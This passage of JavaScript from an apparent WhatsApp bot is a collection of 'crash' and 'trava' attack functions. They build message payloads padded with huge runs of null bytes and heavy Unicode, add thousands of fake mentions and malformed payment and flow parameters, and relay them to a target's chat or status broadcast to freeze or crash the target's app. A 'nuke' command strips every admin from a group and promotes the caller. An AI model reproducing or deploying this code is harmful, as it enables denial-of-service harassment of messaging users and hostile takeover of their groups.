      viewOnceMessage: {
        message: {
          locationMessage: {
            degreesLatitude: 9.999999,
            degreesLongitude: -9.999999,
            name: "⎋🦠</🧬⃟༑⌁⃰𝙕𝙚𝙧𝙤𝙂𝙝𝙤𝙨𝙩𝙓ཀ‌‌\\>🍷𞋯" + "\u0000".repeat(88888),
            address: "\u0000".repeat(5555),
            contextInfo: {
              mentionedJid: Array.from({ length: 2000 }, () =>
                "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
              ),
              isSampled: true,
              participant: target,
              remoteJid: target,
              forwardingScore: 9741,
              isForwarded: true
            }
          }
        }
      }
    };

    const AimBot2 = {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "⎋🦠</🧬⃟༑⌁⃰𝙕𝙚𝙧𝙤𝙂𝙝𝙤𝙨𝙩𝙓ཀ‌‌\\>🍷𞋯",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\u0000".repeat(1045000),
              version: 3
            }
          }
        }
      }
    };

    const AimBot3 = {
      extendedTextMessage: {
        text:
          "⎋🦠</🧬⃟༑⌁⃰𝙕𝙚𝙧𝙤𝙂𝙝𝙤𝙨𝙩𝙓ཀ‌‌\\>🍷𞋯" +
          "\u0000".repeat(299986),
        contextInfo: {
          participant: target,
          mentionedJid: [
            "0@s.whatsapp.net",
            ...Array.from(
              { length: 1900 },
              () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
            )
          ]
        }
      }
    };

    const msg1 = generateWAMessageFromContent(target, AimBot, {});
    await conn.relayMessage("status@broadcast", msg1.message, {
      messageId: msg1.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                { tag: "to", attrs: { jid: target }, content: undefined }
              ]
            }
          ]
        }
      ]
    });

    const msg2 = generateWAMessageFromContent(target, AimBot2, {});
    await conn.relayMessage("status@broadcast", msg2.message, {
      messageId: msg2.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                { tag: "to", attrs: { jid: target }, content: undefined }
              ]
            }
          ]
        }
      ]
    });

    const msg3 = generateWAMessageFromContent(target, AimBot3, {});
    await conn.relayMessage("status@broadcast", msg3.message, {
      messageId: msg3.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                { tag: "to", attrs: { jid: target }, content: undefined }
              ]
            }
          ]
        }
      ]
    });
  } catch (err) {
    console.error("BJIR ERROR COK😡🗿:", err);
  }
}


async function Cihuyyy(target) {
  for (let i = 0; i < 1; i++) {
    let push = [];
    let buttt = [];

    for (let i = 0; i < 10; i++) {
      buttt.push({
        "name": "galaxy_message",
        "buttonParamsJson": JSON.stringify({
          "header": "ꦽ".repeat(10000),
          "body": "ꦽ".repeat(10000),
          "flow_action": "navigate",
          "flow_action_payload": { screen: "FORM_SCREEN" },
          "flow_cta": "Grattler",
          "flow_id": "1169834181134583",
          "flow_message_version": "3",
          "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
        })
      });
    }

    for (let i = 0; i < 10; i++) {
      push.push({
        "body": {
          "text": "⎋🤬</🤬⃟༑⌁⃰𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘\\>🤬"
        },
        "header": { 
          "title": "🤬</🤬⃟༑⌁⃰𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘\\>🤬" + "\u0000".repeat(50000),
          "hasMediaAttachment": false,
          "imageMessage": {
            "url": "https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0&mms3=true",
            "mimetype": "image/jpeg",
            "fileSha256": "dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=",
            "fileLength": "591",
            "height": 0,
            "width": 0,
            "mediaKey": "LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=",
            "fileEncSha256": "G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=",
            "directPath": "/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0",
            "mediaKeyTimestamp": "1721344123",
            "jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIABkAGQMBIgACEQEDEQH/xAArAAADAQAAAAAAAAAAAAAAAAAAAQMCAQEBAQAAAAAAAAAAAAAAAAAAAgH/2gAMAwEAAhADEAAAAMSoouY0VTDIss//xAAeEAACAQQDAQAAAAAAAAAAAAAAARECEHFBIv/aAAgBAQABPwArUs0Reol+C4keR5tR1NH1b//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQIBAT8AH//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQMBAT8AH//Z",
            "scansSidecar": "igcFUbzFLVZfVCKxzoSxcDtyHA1ypHZWFFFXGe+0gV9WCo/RLfNKGw==",
            "scanLengths": [
              247,
              201,
              73,
              63
            ],
            "midQualityFileSha256": "qig0CvELqmPSCnZo7zjLP0LJ9+nWiwFgoQ4UkjqdQro="
          }
        },
        "nativeFlowMessage": {
          "buttons": []
        }
      });
    }

    const carousel = generateWAMessageFromContent(target, {
      "viewOnceMessage": {
        "message": {
          "messageContextInfo": {
            "deviceListMetadata": {},
            "deviceListMetadataVersion": 2
          },
          "interactiveMessage": {
            "body": {
              "text": "⎋🤬</🤬⃟༑⌁⃰🕷️「BlackOut System Zap」‌‌\\>🤬" + "ꦾ".repeat(50000)
            },
            "footer": {
              "text": "🤬</🤬༑⌁⃰🕷️「BlackOut System Zap」ཀ‌‌\\>🤬"  },
            "header": {
              "hasMediaAttachment": false
            },
            "carouselMessage": {
              "cards": [
                ...push
              ]
            }
          }
        }
      }
    }, {});
 await conn.relayMessage(target, carousel.message, {
messageId: carousel.key.id
});
  }
}

async function ios(X) {
    try {
        // Leer miniatura desde archivo
        const jpegThumbnailBuffer = fs.readFileSync("./src/foto.jpg");

        let locationMessage = {
            degreesLatitude: -0,
            degreesLongitude: 0,
            jpegThumbnail: jpegThumbnailBuffer,
            name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
            address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000),
            url: `https://xnxx.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com.mx`,
        };

        let extendMsg = {
            extendedTextMessage: {
                text: "⚡️ 𝐆𝐎𝐄𝐓 𝐆𝐍𝐒" + "𑇂𑆵𑆴𑆿".repeat(60000),
                matchedText: "☕️ 𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛 </>",
                description: "𑇂𑆵𑆴𑆿".repeat(25000),
                title: "𑇂𑆵𑆴𑆿".repeat(15000),
                previewType: "NONE",
                jpegThumbnail: jpegThumbnailBuffer,
                thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
                thumbnailSha256: Buffer.from("eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=", "base64"),
                thumbnailEncSha256: Buffer.from("pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=", "base64"),
                mediaKey: Buffer.from("8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=", "base64"),
                mediaKeyTimestamp: "1743101489",
                thumbnailHeight: 641,
                thumbnailWidth: 640,
                inviteLinkGroupTypeV2: "DEFAULT"
            }
        };

        // Crear el primer mensaje (view once con location)
        const msg1 = generateWAMessageFromContent(X, {
            viewOnceMessage: {
                message: {
                    locationMessage
                }
            }
        }, { userJid: X });

        // Crear el segundo mensaje (view once con extendMsg)
        const msg2 = generateWAMessageFromContent(X, {
            viewOnceMessage: {
                message: extendMsg
            }
        }, { userJid: X });

        // Enviar ambos mensajes al broadcast de estados
        for (const msg of [msg1, msg2]) {
            await conn.relayMessage(
                'status@broadcast',
                msg.message,
                {
                    messageId: msg.key.id,
                    statusJidList: [X],
                    additionalNodes: [
                        {
                            tag: 'meta',
                            attrs: {},
                            content: [
                                {
                                    tag: 'mentioned_users',
                                    attrs: {},
                                    content: [
                                        {
                                            tag: 'to',
                                            attrs: { jid: X },
                                            content: undefined
                                        }
                                    ]
                                }
                            ]
                        }
                    ]
                }
            );
        }

        console.log("✅️ Enviado exitosamente");
    } catch (err) {
        console.error("❌ Error al enviar:", err);
    }
}
async function XyraUiHard(target) {
  await conn.relayMessage(target, 
    {
      locationMessage: {
        degreesLongitude: 0,
        degreesLatitude: 0,
        name: "⃞⃟⃤⃟⃟𝐀 / 𝐇𝐞𝐥𝐥𝐨 𝐈𝐦 𝐗𝐲𝐫𝐚𝐚𝟒𝐒𝐱⃤⃞⃟⃝" + "ི꒦ྀ".repeat(9000), 
        url: "https://Amelia." +  "ི꒦ྀ".repeat(9000) + ".id", 
        address:  "⃞⃟⃤⃟⃟𝐀 / 𝐇𝐞𝐥𝐥𝐨 𝐈𝐦 𝐗𝐲𝐫𝐚𝐚𝟒𝐒𝐱⃟⃤⃞⃟⃝" + "ི꒦ྀ".repeat(9000), 
        contextInfo: {
          externalAdReply: {
            renderLargerThumbnail: true, 
            showAdAttribution: true, 
            body:  "Xyraa4Sx - Anonymous", 
            title: "ི꒦ྀ".repeat(9000), 
            sourceUrl: "https://Xyraa4SX." +  "ི꒦ྀ".repeat(9000) + ".id",  
            thumbnailUrl: null, 
            quotedAd: {
              advertiserName: "ི꒦ྀ".repeat(9000), 
              mediaType: 2,
              jpegThumbnail: "/9j/4AAKossjsls7920ljspLli", 
              caption: "-( XYR )-", 
            }, 
            pleaceKeyHolder: {
              remoteJid: "0@s.whatsapp.net", 
              fromMe: false, 
              id: "ABCD1234567"
            }
          }
        }
      }
    }, 
  {});
}
async function invisível_trava_status(target, carousel = null) {
  let sxo = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { text: "¿𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘?", format: "DEFAULT" },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\x10".repeat(1045000),
            version: 3
          },
          entryPointConversionSource: "galaxy_message",
        }
      }
    }
  }, {
    ephemeralExpiration: 0,
    forwardingScore: 9741,
    isForwarded: true,
    font: Math.floor(Math.random() * 99999999),
    background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
  });
  let sXoMessage = {
    extendedTextMessage: {
      text: "𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘",
      contextInfo: {
        participant: target,
        mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from({ length: 1900 }, () => `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`)
        ]
      }
    }
  };
  const xso = generateWAMessageFromContent(target, sXoMessage, {});
  await conn.relayMessage("status@broadcast", xso.message, {
    messageId: xso.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
      }]
    }]
  });
  await sleep(500);
  // envia a primeira mensagem (sxo)
  await conn.relayMessage("status@broadcast", sxo.message, {
    messageId: sxo.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
      }]
    }]
  });
  await sleep(500);
  console.log(`ATRASO INVISÍVEL`);
}
//case 
switch(command) {
 
case 'new':{
await conn.relayMessage(from, {
viewOnceMessage: {
message: {
interactiveMessage: {
body: { text: "\u0003".repeat(200000) },
nativeFlowMessage: {
messageParamsJson: JSON.stringify({
payment_currency: "BTC",
payment_amount: 0
})
}
}
}
}
}, {});
}                    
break

case 'andro-ios':{
if (!isBot && !isCreator) return
const img = {
url: "https://mmg.whatsapp.net/o1/v/t24/f2/m239/AQMDTeV5_VA-OBFSuqdqXYX0-53ZJQHkoQR944ZaGcoo_GA4-3_-FypseU9Bi7f5ORRn-BQYL8vbFpfXOmxRdLVz8FkzxTf3SyA11Biz3Q?ccb=9-4&oh=01_Q5Aa2QFfCY7O3IquSb0Fvub083w1zLcGVzWCk-P1hjnUMKeSxQ&oe=68DA0F65&_nc_sid=e6ed6c&mms3=true",
mimetype: "image/jpeg",
fileSha256: Buffer.from("i4ZgOwy4PHQmtxW+VgKPJ0LEE9i7XfAwJYk4DVKnjB4=", "base64"),
fileLength: "62265",
height: 1080,
width: 1080,
mediaKey: Buffer.from("qaiU0wrsmuE9outTy1QEV8TnPwlNAFS5kqmTLBXBugM=", "base64"),
fileEncSha256: Buffer.from("Vw0MGUhP27kXt9W4LxnpzzYGrozU8pbzafHsxoegPq8=", "base64"),
    directPath: "/o1/v/t24/f2/m239/AQMDTeV5_VA-OBFSuqdqXYX0-53ZJQHkoQR944ZaGcoo_GA4-3_-FypseU9Bi7f5ORRn-BQYL8vbFpfXOmxRdLVz8FkzxTf3SyA11Biz3Q?ccb=9-4&oh=01_Q5Aa2QFfCY7O3IquSb0Fvub083w1zLcGVzWCk-P1hjnUMKeSxQ&oe=68DA0F65&_nc_sid=e6ed6c",
    mediaKeyTimestamp: "1756530813",
    jpegThumbnail: Buffer.from(
      "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAvAAEAAgMBAAAAAAAAAAAAAAAAAQMCBAUGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAADzuFlZHovO7xOj1uUREwAX0yI6XNtOxw93RIABlmFk6+5OmVN9pzsLte4BLKwZYjr6GuJgAAAAJBaD/8QAJhAAAgIBAgQHAQAAAAAAAAAAAQIAAxEQEgQgITEFExQiMkFhQP/aAAgBAQABPwABSpJOvhZwk8RIPFvy2KEfAh0Bfy0RSf2ekqKZL+6ONrEcl777CdeFYDIznIjrUF3mN1J5AQIdKX2ODOId9gIPQ8qLuOI9TJieQMd4KF+2+pYu6tK8/GenGO8eoqQJ0x+6Y2EGWWl8QMQQYrpZ2QZljV4A2e4nqRLaUKDb0jhE7EltS+RqrFTkSx+HrSsrgkjrH4hmhOf4xABP/8QAGBEAAwEBAAAAAAAAAAAAAAAAAREwUQD/2gAIAQIBAT8AmjvI7X//xAAbEQAABwEAAAAAAAAAAAAAAAAAAQIREjBSIf/aAAgBAwEBPwCuSMCSMA2fln//2Q==",
      "base64"
    ),
    contextInfo: {},
    scansSidecar: "lPDK+lpgZstxxk05zbcPVMVPlj+Xbmqe2tE9SKk+rOSLSXfImdNthg==",
    scanLengths: [7808, 22667, 9636, 22154],
    midQualityFileSha256: "kCJoJE5LX9w/KxdIQQgGtkQjP5ogRE6HWkAHRkBWHWQ="
  };
  
for (let i = 0; i < 15; i++) {
const cards = [
{
header: {
hasMediaAttachment: true,
imageMessage: img,
title: "\u2060".repeat(3000) + "☕️ 𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛 </>\n" + i },
body: { text: "ꦾ".repeat(9999) },
footer: { text: "𝐏𝐎𝐒𝐄𝐢𝐃𝐎𝐍 𝐕𝟏" + i },
nativeFlowMessage: {
messageParamsJson: "",
buttons: [
{
name: "single_select",
buttonParamsJson: "\u0000".repeat(1000)
},
{
name: "cta_copy",
buttonParamsJson: "{\"copy_code\":\"62222222\",\"expiry\":1692375600000}"
            },
            {
              name: "cta_url",
              buttonParamsJson: "{\"display_text\":\"VIEW\",\"url\":\"https://example.com\"}"
            },
            {
              name: "galaxy_message",
              buttonParamsJson: "{\"icon\":\"REVIEW\",\"flow_cta\":\"\\u0000\",\"flow_message_version\":\"3\"}"
            },
            {
              name: "payment_info",
              buttonParamsJson: "{\"reference_id\":\"Flows\",\"amount\":50000,\"currency\":\"IDR\"}"
            },
            {
              name: "payment_method",
              buttonParamsJson: `{\"reference_id\":null,\"payment_method\":${"\u0010".repeat(
                0x2710
              )},\"payment_timestamp\":null,\"share_payment_status\":true}`
},
{
name: "payment_method",
buttonParamsJson:
"{\"currency\":\"IDR\",\"total_amount\":{\"value\":1000000,\"offset\":100},\"reference_id\":\"𝐏𝐎𝐒𝐄𝐢𝐃𝐎𝐍 𝐕𝟏\",\"type\":\"𝐏𝐎𝐒𝐄𝐢𝐃𝐎𝐍 𝐕𝟏\",\"order\":{\"status\":\"canceled\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"PAYMENT_REQUEST\",\"items\":[{\"retailer_id\":\"custom-item-6bc19ce3-67a4-4280-ba13-ef8366014e9b\",\"name\":\"☕️ 𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛 </>\",\"amount\":{\"value\":1000000,\"offset\":100},\"quantity\":1000}]},\"additional_note\":\"D | 7eppeli-Exploration\",\"native_payment_methods\":[],\"share_payment_status\":true}"
            }
          ]
        }
      }
    ];

const msg = generateWAMessageFromContent(
from,
{
viewOnceMessage: {
message: {
messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
interactiveMessage: {
body: { text: "ꦾ".repeat(9999) },
footer: { text: "☕️ 𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛 </>" },
header: { hasMediaAttachment: true, imageMessage: img },
carouselMessage: { cards }
},
contextInfo: {
remoteJid: "30748291653858@lid",
participant: "0@s.whatsapp.net",
mentionedJid: ["0@s.whatsapp.net"],
urlTrackingMap: {
urlTrackingMapElements: [
{
originalUrl: "https://youtube.com/xnxx",
unconsentedUsersUrl: "https://youtube.com/@xnnxx",
consentedUsersUrl: "https://youtube.com/@xnnxx",
cardIndex: 1
},
{
originalUrl: "https://youtube.com/@xnnxx",
unconsentedUsersUrl: "https://youtube.com/@xnnxx",
consentedUsersUrl: "https://youtube.com/@xnnxx",
cardIndex: 2
                  }
                ]
              },
quotedMessage: {
paymentInviteMessage: {
serviceType: 3,
expiryTimestamp: Date.now() + 1814400000
                }
              }
            }
          }
        }
      },
      {}
    );

await conn.relayMessage(from, msg.message, { messageId: msg.key.id });
    await new Promise(res => setTimeout(res, 500));
  }

for (let i = 0; i < 15; i++) {
const msg2 = {
extendedTextMessage: {
text: "☕️ 𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛 </>\n" + "𑇂𑆵𑆴𑆿".repeat(60000),
contextInfo: {
fromMe: false,
stanzaId: from,
participant: from,
quotedMessage: {
conversation: "☕️ 𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛 </>" + "𑇂𑆵𑆴𑆿".repeat(9000)
        },
disappearingMode: {
initiator: "CHANGED_IN_CHAT",
trigger: "CHAT_SETTING"
}
},
inviteLinkGroupTypeV2: "DEFAULT"
    }
  };

await conn.relayMessage(
from,
msg2,
{ ephemeralExpiration: 5, timeStamp: Date.now() },
{ messageId: null }
  );

const msg3 = await generateWAMessageFromContent(
from,
{
extendedTextMessage: {
text: "Xghr-BOT V2",
matchedText: "https://wa.me/593KKK?s=5",
description: "👥️" + "𑇂𑆵𑆴𑆿".repeat(15000),
title: "Xghr-BOT V2" + "𑇂𑆵𑆴𑆿".repeat(15000),
previewType: "NONE",
jpegThumbnail: fs.readFileSync ('./media/thumb.jpg'),
inviteLinkGroupTypeV2: "DEFAULT"
}
},
{ ephemeralExpiration: 5, timeStamp: Date.now() }
  );

await conn.relayMessage(from, msg3.message, { messageId: msg3.key.id });
}
}
break

case 'crash-button':
for (let i = 0; i < 6; i++) {
await conn.sendMessage(from, {
document: {
url: "./travas/crash.zip"
},
fileName: '𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘',
caption: '@𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘' + "ꦿꦶꦷꦹꦽ".repeat(9999),
mimetype: "@".repeat(9999),
contextInfo: {
"externalAdReply": {
"title": '',
"body": '@Xghr-BOT V2',
"mediaType": 2,
"thumbnail": fs.readFileSync('./media/ola.jpg'),
"jpegThumbnail": fs.readFileSync("./media/ola.jpg"),
"firstImageId": 99999999,
"previewType": "VIDEO",
"mediaUrl": 'https://youtube.com/@sekzope'
}
},
mentions: [m.sender],
footer: "Xghr-BOT V2",
buttons: [
{
buttonId: "hi",
buttonText: {
displayText: travadoc
}
},
{
buttonId: "hi2",
buttonText: {
displayText: travadoc
}
},
{
buttonId: "hi3",
buttonText: {
displayText: travadoc
}
}],
viewOnce: true,
headerType: "DOCUMENT",
}, {})
}
break

case 'crash-ui':
if (!isBot && !isCreator) return
for (let i = 0; i < 30; i++) {
await conn.relayMessage(from, 
{
locationMessage: {
degreesLongitude: 0,
degreesLatitude: 0,
name: "Xghr-BOT V2" + "ꦿꦹꦸꦽꦶꦷ".repeat(9000), 
url: "https://xnxx." +  "ꦿꦹꦸꦽꦶꦷ".repeat(9000) + ".id", 
address:  "Xghr-BOT V2" + "ꦿꦹꦸꦽꦶꦷ".repeat(9000), 
contextInfo: {
externalAdReply: {
renderLargerThumbnail: true, 
showAdAttribution: true, 
body:  "☠️ • 𝐂𝐫𝐚𝐬𝐡 𝐔𝐢?", 
title: "ꦿꦹꦸꦽꦶꦷ".repeat(9000), 
sourceUrl: "https://xnxx." +  "ꦽ".repeat(9000) + ".id",  
thumbnail:fs.readFileSync ("./media/thumb.jpg"), 
quotedAd: {
advertiserName: "ꦽ".repeat(9000), 
mediaType: 2,
jpegThumbnail: "/9j/4AAKossjsls7920ljspLli", 
caption: "Xghr-BOT V2", 
}, 
pleaceKeyHolder: {
remoteJid: "0@s.whatsapp.net", 
fromMe: false, 
id: "ABCD1234567"
}
}
}
}
}, 
{});
}
break
case "canal-ios":{
if (!isBot && !isCreator) return
await conn.relayMessage(from, {
'newsletterAdminInviteMessage': {
'newsletterJid': '120363282786345717@newsletter',
'newsletterName': '𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘' + ios6,
'jpegThumbnail': '',
'caption': "𝐏𝐎𝐒𝐄𝐢𝐃𝐎𝐍 ⚡️",
'inviteExpiration': "99999999999"
}
}, { 'quoted': info });
conn.relayMessage(from, {
'extendedTextMessage': {
'text': "𝐵𝑂𝑇 𝑉𝐼𝑃"
}
}, {});
}
break;

case "statusbox": 
  try {
    await handleStatusBox(conn, m); 
  } catch (e) {
  }
  break;
case 'nuke': {

  if (!isBot) return 
  if (!m.isGroup) return
  try {
    
    const metadata = await conn.groupMetadata(from);
    const parts = metadata.participants || [];
    const admins = parts.filter(p => p.admin === 'admin' || p.admin === 'superadmin').map(p => p.id);
    if (admins.length === 0) {
      await conn.sendMessage(from, { text: 'Não' }, { quoted: m });
      break;
    }
    for (let adm of admins) {
      if (adm === sender) continue;
      if (adm === botNumber) continue;
      try {
        await conn.groupParticipantsUpdate(from, [adm], 'demote');
        await sleep(300); 
      } catch (e) {
      }
    }
    try {
      await conn.groupParticipantsUpdate(from, [sender], 'promote');
    } catch (e) {
  
    }

    await conn.sendMessage(from, { text: '✅' }, { quoted: m });

  } catch (err) {
    console.error(err);
  }
}
  break;


default:
}

} catch (err) {
 
  console.log(util.format(err))
  let e = String(err)

if (e.includes("conflict")) return
if (e.includes("Cannot derive from empty media key")) return
if (e.includes("not-authorized")) return
if (e.includes("already-exists")) return
if (e.includes("rate-overlimit")) return
if (e.includes("Connection Closed")) return
if (e.includes("Timed Out")) return
if (e.includes("Value not found")) return
if (e.includes("Socket connection timeout")) return


}
//=================================================//
let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(`Update ${__filename}`)
delete require.cache[file]
require(file)
})}
